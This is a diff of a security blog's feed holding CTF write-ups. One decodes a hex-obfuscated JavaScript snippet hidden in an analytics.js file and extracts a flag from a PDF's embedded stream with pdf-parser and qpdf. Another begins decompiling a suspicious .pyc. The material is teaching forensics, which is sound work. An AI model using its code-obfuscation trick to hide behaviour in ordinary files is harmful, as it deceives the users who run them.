+2014-09-25 19:17:19 &lt;span class="o"&gt;(&lt;/span&gt;2.02 MB/s&lt;span class="o"&gt;)&lt;/span&gt; - ‘analytics.js’ saved &lt;span class="o"&gt;[&lt;/span&gt;16072/16072&lt;span class="o"&gt;]&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;The file turns out to be large, and &lt;em&gt;grep&lt;/em&gt; &lt;em&gt;flag&lt;/em&gt; or &lt;em&gt;key&lt;/em&gt; doesn't show any hit. No IP addresses or URL neither.&lt;/p&gt;
 &lt;p&gt;OK, let's take a closer look. We open the file in a text editor and we find a weird hex-encoded variable that is completely unconnected from the rest:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;var _0x91fe = [&amp;quot;\x68\x74\x74\x70\x3A\x2F\x2F\x31\x32\x38\x2E\x32\x33\x38\x2E\x36\x36\x2E\x31\x30\x30\x2F\x61\x6E\x6E\x6F\x75\x6E\x63\x65\x6D\x65\x6E\x74\x2E\x70\x64\x66&amp;quot;, &amp;quot;\x5F\x73\x65\x6C\x66&amp;quot;, &amp;quot;\x6F\x70\x65\x6E&amp;quot;];
-window[_0x91fe[2]](_0x91fe[0], _0x91fe[1]);
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;var&lt;/span&gt; &lt;span class="n"&gt;_0x91fe&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x68\x74\x74\x70\x3A\x2F\x2F\x31\x32\x38\x2E\x32\x33\x38\x2E\x36\x36\x2E\x31\x30\x30\x2F\x61\x6E\x6E\x6F\x75\x6E\x63\x65\x6D\x65\x6E\x74\x2E\x70\x64\x66&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x5F\x73\x65\x6C\x66&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x6F\x70\x65\x6E&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
+&lt;span class="n"&gt;window&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;_0x91fe&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;]](&lt;/span&gt;&lt;span class="n"&gt;_0x91fe&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="n"&gt;_0x91fe&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;We decode it using Python or a &lt;a href="http://ddecode.com/hexdecoder/"&gt;online hex-decode&lt;/a&gt; and we get another file:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x68\x74\x74\x70\x3A\x2F\x2F\x31\x32\x38\x2E\x32\x33\x38\x2E\x36\x36\x2E\x31\x30\x30\x2F\x61\x6E\x6E\x6F\x75\x6E\x63\x65\x6D\x65\x6E\x74\x2E\x70\x64\x66&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x5F\x73\x65\x6C\x66&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x6F\x70\x65\x6E&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;http://128.238.66.100/announcement.pdf&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;_self&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;open&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x68\x74\x74\x70\x3A\x2F\x2F\x31\x32\x38\x2E\x32\x33\x38\x2E\x36\x36\x2E\x31\x30\x30\x2F\x61\x6E\x6E\x6F\x75\x6E\x63\x65\x6D\x65\x6E\x74\x2E\x70\x64\x66&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x5F\x73\x65\x6C\x66&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x6F\x70\x65\x6E&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;http://128.238.66.100/announcement.pdf&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;_self&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;open&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Opening the URL leads to this picture:
-&lt;img alt="" src="http://i.imgur.com/CNEQhfG.png"&gt;&lt;/p&gt;
+&lt;img alt="" src="http://i.imgur.com/CNEQhfG.png" /&gt;&lt;/p&gt;
 &lt;p&gt;LOL. Funny, but no flag yet...&lt;/p&gt;
 &lt;p&gt;It should be in the PDF somewhere!&lt;/p&gt;
-&lt;hr&gt;
+&lt;hr /&gt;
 &lt;h2&gt;Finding the Second Hex-encoded String: Approach I&lt;/h2&gt;
 &lt;p&gt;All right, let's use what we learned from the &lt;a href="http://bt3gl.github.io/forensics-200-obscurity.html"&gt;CSAW CTF 2014 Forensic -Obscurity&lt;/a&gt; problem. First, let's see if we find the flag with a simple grep:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$./pdf-parser.py announcement.pdf &lt;span class="p"&gt;|&lt;/span&gt; grep flag
-$./pdf-parser.py announcement.pdf &lt;span class="p"&gt;|&lt;/span&gt; grep key
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$.&lt;/span&gt;/pdf-parser.py announcement.pdf | grep flag
+&lt;span class="nv"&gt;$.&lt;/span&gt;/pdf-parser.py announcement.pdf | grep key
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;No luck. Let us ID the file to see if we find any funny stream:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ ./pdfid.py announcement.pdf PDFiD &lt;span class="m"&gt;0&lt;/span&gt;.1.2 announcement.pdf
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;./pdfid.py announcement.pdf PDFiD 0.1.2 announcement.pdf
  PDF Header: %PDF-1.4
- obj                    &lt;span class="m"&gt;9&lt;/span&gt;
- endobj                 &lt;span class="m"&gt;9&lt;/span&gt;
- stream                 &lt;span class="m"&gt;4&lt;/span&gt;
- endstream              &lt;span class="m"&gt;4&lt;/span&gt;
- xref                   &lt;span class="m"&gt;1&lt;/span&gt;
- trailer                &lt;span class="m"&gt;1&lt;/span&gt;
- startxref              &lt;span class="m"&gt;1&lt;/span&gt;
- /Page                  &lt;span class="m"&gt;1&lt;/span&gt;
- /Encrypt               &lt;span class="m"&gt;0&lt;/span&gt;
- /ObjStm                &lt;span class="m"&gt;0&lt;/span&gt;
- /JS                    &lt;span class="m"&gt;0&lt;/span&gt;
- /JavaScript            &lt;span class="m"&gt;0&lt;/span&gt;
- /AA                    &lt;span class="m"&gt;0&lt;/span&gt;
- /OpenAction            &lt;span class="m"&gt;0&lt;/span&gt;
- /AcroForm              &lt;span class="m"&gt;0&lt;/span&gt;
- /JBIG2Decode           &lt;span class="m"&gt;0&lt;/span&gt;
- /RichMedia             &lt;span class="m"&gt;0&lt;/span&gt;
- /Launch                &lt;span class="m"&gt;0&lt;/span&gt;
- /EmbeddedFile          &lt;span class="m"&gt;1&lt;/span&gt;
- /XFA                   &lt;span class="m"&gt;0&lt;/span&gt;
- /Colors &amp;gt; &lt;span class="m"&gt;2&lt;/span&gt;^24         &lt;span class="m"&gt;0&lt;/span&gt;
+ obj                    9
+ endobj                 9
+ stream                 4
+ endstream              4
+ xref                   1
+ trailer                1
+ startxref              1
+ /Page                  1
+ /Encrypt               0
+ /ObjStm                0
+ /JS                    0
+ /JavaScript            0
+ /AA                    0
+ /OpenAction            0
+ /AcroForm              0
+ /JBIG2Decode           0
+ /RichMedia             0
+ /Launch                0
+ /EmbeddedFile          1
+ /XFA                   0
+ /Colors &amp;gt; 2^24         0
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Oh, cool, there is a &lt;strong&gt;Embedded File&lt;/strong&gt;! Let's look closer to this object:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ ./pdf-parser.py --stats announcement.pdf Comment: &lt;span class="m"&gt;3&lt;/span&gt;
-XREF: &lt;span class="m"&gt;1&lt;/span&gt;
-Trailer: &lt;span class="m"&gt;1&lt;/span&gt;
-StartXref: &lt;span class="m"&gt;1&lt;/span&gt;
-Indirect object: &lt;span class="m"&gt;9&lt;/span&gt;
-  &lt;span class="m"&gt;2&lt;/span&gt;: &lt;span class="m"&gt;3&lt;/span&gt;, &lt;span class="m"&gt;7&lt;/span&gt;
- /Catalog &lt;span class="m"&gt;1&lt;/span&gt;: &lt;span class="m"&gt;6&lt;/span&gt;
- /EmbeddedFile &lt;span class="m"&gt;1&lt;/span&gt;: &lt;span class="m"&gt;8&lt;/span&gt;
- /Filespec &lt;span class="m"&gt;1&lt;/span&gt;: &lt;span class="m"&gt;9&lt;/span&gt;
- /Page &lt;span class="m"&gt;1&lt;/span&gt;: &lt;span class="m"&gt;5&lt;/span&gt;
- /Pages &lt;span class="m"&gt;1&lt;/span&gt;: &lt;span class="m"&gt;4&lt;/span&gt;
- /XObject &lt;span class="m"&gt;2&lt;/span&gt;: &lt;span class="m"&gt;1&lt;/span&gt;, &lt;span class="m"&gt;2&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;./pdf-parser.py --stats announcement.pdf Comment: 3
+XREF: 1
+Trailer: 1
+StartXref: 1
+Indirect object: 9
+  2: 3, 7
+ /Catalog 1: 6
+ /EmbeddedFile 1: 8
+ /Filespec 1: 9
+ /Page 1: 5
+ /Pages 1: 4
+ /XObject 2: 1, 2
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Nice. So now we can decode our pdf file using the &lt;strong&gt;object code&lt;/strong&gt;, which we can see  above that is &lt;strong&gt;8&lt;/strong&gt;:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ ./pdf-parser.py --object &lt;span class="m"&gt;8&lt;/span&gt; --raw --filter announcement.pdf
-obj &lt;span class="m"&gt;8&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;./pdf-parser.py --object 8 --raw --filter announcement.pdf
+obj 8 0
  Type: /EmbeddedFile
  Referencing:
  Contains stream
 
   &amp;lt;&amp;lt;
-    /Length &lt;span class="m"&gt;212&lt;/span&gt;
+    /Length 212
     /Type /EmbeddedFile
     /Filter /FlateDecode
     /Params
       &amp;lt;&amp;lt;
-        /Size &lt;span class="m"&gt;495&lt;/span&gt;
+        /Size 495
         /Checksum &amp;lt;7f0104826bde58b80218635f639b50a9&amp;gt;
       &amp;gt;&amp;gt;
     /Subtype /application/pdf
   &amp;gt;&amp;gt;
 
- var &lt;span class="nv"&gt;_0xee0b&lt;/span&gt;&lt;span class="o"&gt;=[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;\x59\x4F\x55\x20\x44\x49\x44\x20\x49\x54\x21\x20\x43\x4F\x4E\x47\x52\x41\x54\x53\x21\x20\x66\x77\x69\x77\x2C\x20\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x20\x6F\x62\x66\x75\x73\x63\x61\x74\x69\x6F\x6E\x20\x69\x73\x20\x73\x6F\x66\x61\x20\x6B\x69\x6E\x67\x20\x64\x75\x6D\x62\x20\x20\x3A\x29\x20\x6B\x65\x79\x7B\x54\x68\x6F\x73\x65\x20\x46\x6C\x75\x66\x66\x79\x20\x42\x75\x6E\x6E\x69\x65\x73\x20\x4D\x61\x6B\x65\x20\x54\x75\x6D\x6D\x79\x20\x42\x75\x6D\x70\x79\x7D&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;var &lt;span class="nv"&gt;y&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;_0xee0b&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+ var &lt;span class="nv"&gt;_0xee0b&lt;/span&gt;&lt;span class="o"&gt;=[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;\x59\x4F\x55\x20\x44\x49\x44\x20\x49\x54\x21\x20\x43\x4F\x4E\x47\x52\x41\x54\x53\x21\x20\x66\x77\x69\x77\x2C\x20\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x20\x6F\x62\x66\x75\x73\x63\x61\x74\x69\x6F\x6E\x20\x69\x73\x20\x73\x6F\x66\x61\x20\x6B\x69\x6E\x67\x20\x64\x75\x6D\x62\x20\x20\x3A\x29\x20\x6B\x65\x79\x7B\x54\x68\x6F\x73\x65\x20\x46\x6C\x75\x66\x66\x79\x20\x42\x75\x6E\x6E\x69\x65\x73\x20\x4D\x61\x6B\x65\x20\x54\x75\x6D\x6D\x79\x20\x42\x75\x6D\x70\x79\x7D&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;;var &lt;span class="nv"&gt;y&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;_0xee0b&lt;span class="o"&gt;[&lt;/span&gt;0&lt;span class="o"&gt;]&lt;/span&gt;;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Which &lt;em&gt;finally&lt;/em&gt; leads to our flag!&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x59\x4F\x55\x20\x44\x49\x44\x20\x49\x54\x21\x20\x43\x4F\x4E\x47\x52\x41\x54\x53\x21\x20\x66\x77\x69\x77\x2C\x20\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x20\x6F\x62\x66\x75\x73\x63\x61\x74\x69\x6F\x6E\x20\x69\x73\x20\x73\x6F\x66\x61\x20\x6B\x69\x6E\x67\x20\x64\x75\x6D\x62\x20\x20\x3A\x29\x20\x6B\x65\x79\x7B\x54\x68\x6F\x73\x65\x20\x46\x6C\x75\x66\x66\x79\x20\x42\x75\x6E\x6E\x69\x65\x73\x20\x4D\x61\x6B\x65\x20\x54\x75\x6D\x6D\x79\x20\x42\x75\x6D\x70\x79\x7D&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x59\x4F\x55\x20\x44\x49\x44\x20\x49\x54\x21\x20\x43\x4F\x4E\x47\x52\x41\x54\x53\x21\x20\x66\x77\x69\x77\x2C\x20\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x20\x6F\x62\x66\x75\x73\x63\x61\x74\x69\x6F\x6E\x20\x69\x73\x20\x73\x6F\x66\x61\x20\x6B\x69\x6E\x67\x20\x64\x75\x6D\x62\x20\x20\x3A\x29\x20\x6B\x65\x79\x7B\x54\x68\x6F\x73\x65\x20\x46\x6C\x75\x66\x66\x79\x20\x42\x75\x6E\x6E\x69\x65\x73\x20\x4D\x61\x6B\x65\x20\x54\x75\x6D\x6D\x79\x20\x42\x75\x6D\x70\x79\x7D&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
 &lt;span class="n"&gt;YOU&lt;/span&gt; &lt;span class="n"&gt;DID&lt;/span&gt; &lt;span class="n"&gt;IT&lt;/span&gt;&lt;span class="err"&gt;!&lt;/span&gt; &lt;span class="n"&gt;CONGRATS&lt;/span&gt;&lt;span class="err"&gt;!&lt;/span&gt; &lt;span class="n"&gt;fwiw&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;javascript&lt;/span&gt; &lt;span class="n"&gt;obfuscation&lt;/span&gt; &lt;span class="ow"&gt;is&lt;/span&gt; &lt;span class="n"&gt;sofa&lt;/span&gt; &lt;span class="n"&gt;king&lt;/span&gt; &lt;span class="n"&gt;dumb&lt;/span&gt;  &lt;span class="p"&gt;:)&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="n"&gt;Those&lt;/span&gt; &lt;span class="n"&gt;Fluffy&lt;/span&gt; &lt;span class="n"&gt;Bunnies&lt;/span&gt; &lt;span class="n"&gt;Make&lt;/span&gt; &lt;span class="n"&gt;Tummy&lt;/span&gt; &lt;span class="n"&gt;Bumpy&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;hr&gt;
+&lt;hr /&gt;
 &lt;h2&gt;Finding the Second Hex-encoded String: Approach II&lt;/h2&gt;
 &lt;p&gt;There is a nice tool called &lt;a href="http://qpdf.sourceforge.net/"&gt;qpdf&lt;/a&gt; that can be very useful here:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ sudp yum install qpdf
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;sudp yum install qpdf
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Now, we just do the following conversion:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ qpdf  --qdf  announcement.pdf  unpacked.pdf
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;qpdf  --qdf  announcement.pdf  unpacked.pdf
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Opening &lt;em&gt;unpacket.pdf&lt;/em&gt; with &lt;a href="http://tarot.freeshell.org/leafpad/"&gt;l3afpad&lt;/a&gt; also leads to the flag :&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;stream
-var _0xee0b=[&amp;quot;\x59\x4F\x55\x20\x44\x49\x44\x20\x49\x54\x21\x20\x43\x4F\x4E\x47\x52\x41\x54\x53\x21\x20\x66\x77\x69\x77\x2C\x20\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x20\x6F\x62\x66\x75\x73\x63\x61\x74\x69\x6F\x6E\x20\x69\x73\x20\x73\x6F\x66\x61\x20\x6B\x69\x6E\x67\x20\x64\x75\x6D\x62\x20\x20\x3A\x29\x20\x6B\x65\x79\x7B\x54\x68\x6F\x73\x65\x20\x46\x6C\x75\x66\x66\x79\x20\x42\x75\x6E\x6E\x69\x65\x73\x20\x4D\x61\x6B\x65\x20\x54\x75\x6D\x6D\x79\x20\x42\x75\x6D\x70\x79\x7D&amp;quot;];var y=_0xee0b[0];
-endstream
-endobj
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;stream&lt;/span&gt;
+&lt;span class="n"&gt;var&lt;/span&gt; &lt;span class="n"&gt;_0xee0b&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x59\x4F\x55\x20\x44\x49\x44\x20\x49\x54\x21\x20\x43\x4F\x4E\x47\x52\x41\x54\x53\x21\x20\x66\x77\x69\x77\x2C\x20\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x20\x6F\x62\x66\x75\x73\x63\x61\x74\x69\x6F\x6E\x20\x69\x73\x20\x73\x6F\x66\x61\x20\x6B\x69\x6E\x67\x20\x64\x75\x6D\x62\x20\x20\x3A\x29\x20\x6B\x65\x79\x7B\x54\x68\x6F\x73\x65\x20\x46\x6C\x75\x66\x66\x79\x20\x42\x75\x6E\x6E\x69\x65\x73\x20\x4D\x61\x6B\x65\x20\x54\x75\x6D\x6D\x79\x20\x42\x75\x6D\x70\x79\x7D&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;&lt;span class="n"&gt;var&lt;/span&gt; &lt;span class="n"&gt;y&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;_0xee0b&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
+&lt;span class="n"&gt;endstream&lt;/span&gt;
+&lt;span class="n"&gt;endobj&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;hr&gt;
-&lt;p&gt;&lt;strong&gt;That's it! Hack all the things!&lt;/strong&gt;&lt;/p&gt;</content><category term="CTF"></category><category term="CSAW"></category><category term="hashcat"></category><category term="pdf-parser"></category><category term="qpdf"></category><category term="LAMP"></category><category term="JavaScript"></category></entry><entry><title>CSAW CTF 2014 - Reverse Engineering 100: "eggshells"</title><link href="http://bt3gl.github.io/csaw-ctf-2014-reverse-engineering-100-eggshells.html" rel="alternate"></link><published>2014-09-22T09:20:00-04:00</published><updated>2014-09-22T09:20:00-04:00</updated><author><name>Marina von Steinkirch</name></author><id>tag:bt3gl.github.io,2014-09-22:/csaw-ctf-2014-reverse-engineering-100-eggshells.html</id><summary type="html">&lt;p&gt;This is the first exploitation problem and it starts with the following text:&lt;/p&gt;
+&lt;hr /&gt;
+&lt;p&gt;&lt;strong&gt;That's it! Hack all the things!&lt;/strong&gt;&lt;/p&gt;</summary><category term="CTF"></category><category term="CSAW"></category><category term="hashcat"></category><category term="pdf-parser"></category><category term="qpdf"></category><category term="LAMP"></category><category term="JavaScript"></category></entry><entry><title>CSAW CTF 2014 - Reverse Engineering 100: "eggshells"</title><link href="http://bt3gl.github.io/csaw-ctf-2014-reverse-engineering-100-eggshells.html" rel="alternate"></link><updated>2014-09-22T09:20:00-04:00</updated><author><name>Mia von Steinkirch</name></author><id>tag:bt3gl.github.io,2014-09-22:csaw-ctf-2014-reverse-engineering-100-eggshells.html</id><summary type="html">&lt;p&gt;This is the first exploitation problem and it starts with the following text:&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;I trust people on the Internet all the time, do you?&lt;/p&gt;
 &lt;p&gt;Written by ColdHeat&lt;/p&gt;
@@ -478,24 +475,12 @@ endobj
 &lt;/blockquote&gt;
 &lt;h2&gt;Unzipping and Analyzing the Files&lt;/h2&gt;
 &lt;p&gt;Let’s unzip the provided zip file:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ unzip eggshells-master.zip
-&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;p&gt;This creates a directory called &lt;em&gt;eggshells-master …&lt;/em&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;This is the first exploitation problem and it starts with the following text:&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;I trust people on the Internet all the time, do you?&lt;/p&gt;
-&lt;p&gt;Written by ColdHeat&lt;/p&gt;
-&lt;p&gt;eggshells-master.zip&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;h2&gt;Unzipping and Analyzing the Files&lt;/h2&gt;
-&lt;p&gt;Let’s unzip the provided zip file:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ unzip eggshells-master.zip
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;unzip eggshells-master.zip
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;This creates a directory called &lt;em&gt;eggshells-master&lt;/em&gt; that contains several &lt;em&gt;Python&lt;/em&gt; and &lt;em&gt;exe&lt;/em&gt; files. Let us look closer to the contend of this folder:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ tree .
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;tree .
 ├── capstone.py
 ├── distorm.py
 ├── interpreter.py
@@ -525,21 +510,21 @@ endobj
 &lt;p&gt;Do you see anything unusual?&lt;/p&gt;
 &lt;h2&gt;Decompiled a pre-compiled Python File&lt;/h2&gt;
 &lt;p&gt;A pre-compiled Python file stands out in this list: &lt;em&gt;utils.pyc&lt;/em&gt;. We need to decompile it. For this task we use  &lt;a href="https://github.com/gstarnberger/uncompyle"&gt;uncompyle2&lt;/a&gt;, which can be installed with:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ sudo pip install uncompyle2
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;sudo pip install uncompyle2
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Let's learn a bit more about this tool with &lt;code&gt;uncompyle2 --help&lt;/code&gt;. The usage is straightfoward, but it's a good knowledge to learn about the &lt;em&gt;-o&lt;/em&gt; flag, which will decompile to a &lt;em&gt;.dis&lt;/em&gt; file instead of &lt;em&gt;stdout&lt;/em&gt;:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Usage: uncompyle2 &lt;span class="o"&gt;[&lt;/span&gt;OPTIONS&lt;span class="o"&gt;]&lt;/span&gt;... &lt;span class="o"&gt;[&lt;/span&gt; FILE &lt;span class="p"&gt;|&lt;/span&gt; DIR&lt;span class="o"&gt;]&lt;/span&gt;...
+&lt;div class="highlight"&gt;&lt;pre&gt;Usage: uncompyle2 &lt;span class="o"&gt;[&lt;/span&gt;OPTIONS&lt;span class="o"&gt;]&lt;/span&gt;... &lt;span class="o"&gt;[&lt;/span&gt; FILE | DIR&lt;span class="o"&gt;]&lt;/span&gt;...
 
 Examples:
-  uncompyle2      foo.pyc bar.pyc       &lt;span class="c1"&gt;# decompile foo.pyc, bar.pyc to stdout&lt;/span&gt;
-  uncompyle2 -o . foo.pyc bar.pyc       &lt;span class="c1"&gt;# decompile to ./foo.dis and ./bar.dis&lt;/span&gt;
-  uncompyle2 -o /tmp /usr/lib/python1.5 &lt;span class="c1"&gt;# decompile whole library&lt;/span&gt;
+  uncompyle2      foo.pyc bar.pyc       &lt;span class="c"&gt;# decompile foo.pyc, bar.pyc to stdout&lt;/span&gt;
+  uncompyle2 -o . foo.pyc bar.pyc       &lt;span class="c"&gt;# decompile to ./foo.dis and ./bar.dis&lt;/span&gt;
